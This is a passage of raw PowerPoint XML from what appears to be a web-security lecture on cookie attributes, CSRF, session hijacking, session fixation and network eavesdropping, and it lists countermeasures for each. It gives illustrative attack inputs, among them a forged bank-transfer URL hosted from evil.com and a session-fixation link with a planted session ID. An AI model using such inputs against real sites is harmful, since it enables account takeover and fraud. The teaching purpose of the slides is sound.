            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The browser automatically stores them and includes them in subsequent requests to the matching domain in the Cookie header.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Because the entire session hinges on the secrecy of the Session ID stored in the cookie, the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> attributes are non-negotiable for security.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="130417313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88AB4-2DF4-D076-A4C7-64398E2E8134}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Cross-Site Request Forgery (CSRF)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80E31A7C-602A-3248-3AB6-FA27586454FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="688259" y="838691"/>
            <a:ext cx="8313173" cy="4072521"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF is a web security vulnerability where an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>attacker tricks a user </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>into performing unauthorized actions on a trusted website by exploiting a user's authenticated session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The Attack Flow:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A user logs into bank.com, and their session cookie is stored.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The user visits evil.com, which contains a hidden form that automatically submits a request to bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>transfer?to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>attacker&amp;amount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=1000.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The browser, doing its job, includes the bank.com session cookie with this forged request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The server at bank.com sees a valid session and processes the transfer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Defense: CSRF Tokens</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The solution is to include a secret, unique, unpredictable value. This token is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>unique per user session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (or even better, per individual request). Stored on server side.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This token must be stored in the user's session on the server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Upon receiving a request, the server compares the token in the request (e.g., in a form field) with the token stored in the session. If they don't match, the request is rejected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> While evil.com can forge a request, it cannot read the CSRF token from the bank.com page due to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Same-Origin Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, so it cannot forge a valid request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="428782873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DB259-0E9D-7058-D6B1-B5DD9034FBFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79AF6340-627E-4B4B-2FAD-BDAC38892179}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3800167" y="146672"/>
            <a:ext cx="5088193" cy="4876185"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="70398149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BC7777-E4B3-F569-DEA4-4FF61B190721}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1687925" y="297446"/>
            <a:ext cx="5288062" cy="4699382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="384863155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9E993-1090-FE29-1B4F-BB15D9370865}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Session Hijacking</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85D4C893-8434-FAEA-1E93-F427BEA08DD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>The Session Hijacking attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0"/>
              <a:t>compromises the session token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> by stealing or predicting a valid session token to gain unauthorized access to the Web Server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Attack Methods:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>Sniffing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t> cookies on insecure Wi-Fi.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>XSS injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>Man-in-the-middle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t> attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Attacker captures </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0" err="1"/>
              <a:t>sessionId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>=xyz123 via Wireshark.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Reuses it in their browser → logged in as the victim.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Countermeasures:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Always use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>TLS/HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>Secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t> flags.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>short session timeouts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Regenerate session IDs on login/logout.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Bind sessions to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" b="1" dirty="0"/>
              <a:t>IP/device fingerprints</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="306443598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6F79C-BC65-17DC-CF14-F3684CAA6AF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Session Fixation</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DB47705-527F-E806-44D3-AD030841595D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attacker forces the victim to use a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>known session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>. When the victim logs in, the attacker reuses the same session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Attacker gives victim a link: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>?sessionId=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>attacker123</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Victim logs in → server ties attacker123 to their account.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Attacker uses the same ID → full access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Countermeasures:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Always </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>regenerate session IDs after login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Do not accept session IDs in URLs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Invalidate old sessions when user logs out.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Set session cookies with Secure and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>device/IP binding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> for sessions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="122579826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20760-ED29-E704-C2DC-640145185A52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Session Fixation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D86BC62-2BE0-A085-B88A-675F3889BCCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1045752" y="788928"/>
            <a:ext cx="5772919" cy="4245692"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="270903854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C6A51-F0F8-2331-CE5D-B3A7E23B5F60}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Network Eavesdropping</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{071CEF73-2A8A-375F-ED1D-123FC9FE6B64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Network Eavesdropping is a cyberattack where an unauthorized party </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>intercepts, monitors, and captures data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>as it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>travels acros</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>s a network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>How it Works: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Networks function by breaking data into small chunks called packets and sending them to a destination. In an insecure network, these packets are broadcasted and can be seen by any device on that network segment. An attacker uses software tools (called sniffers, like Wireshark) to capture and analyze these packets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Common Techniques for Eavesdropping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Passive Sniffing: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>silent observer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. They place a tool (a packet sniffer) on the network to capture and record all data packets that pass by, but they </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>do not alter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, generate, or interfere with any network traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Active Sniffing: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>actively intercepts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and potentially alters communication between two parties. They make their presence part of the network conversation to redirect traffic through their own system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2443949057"/>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2BC45-310D-3BCD-F5D2-188A3BD59132}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86C17F06-339F-E0ED-3F60-C6CFB4571F3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
